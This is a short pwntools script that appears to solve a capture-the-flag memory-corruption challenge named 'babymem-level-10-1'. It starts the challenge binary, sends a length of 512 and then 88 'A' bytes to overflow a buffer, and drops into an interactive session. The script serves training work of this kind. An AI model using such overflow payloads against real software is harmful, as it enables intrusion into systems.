
from pwn import *

elf = ELF('/challenge/babymem-level-10-1')
context.arch = "amd64"

io = elf.process()
io.sendline(b"512")
io.send(b"A"*88)
io.interactive()